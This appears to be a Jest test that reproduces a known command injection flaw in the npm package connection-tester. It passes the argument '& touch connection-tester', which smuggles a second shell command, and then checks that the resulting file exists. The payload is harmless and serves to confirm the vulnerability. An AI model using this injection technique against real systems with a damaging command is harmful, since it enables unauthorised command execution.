//https://snyk.io/vuln/SNYK-JS-CONNECTIONTESTER-1048337
test("Command Injection in connection-tester", () => {
  const a = require("connection-tester");
  const fs = require("fs");
  const path = "./connection-tester";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    a.test("& touch connection-tester");
  } catch (error) {
    console.log("error");
  }

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
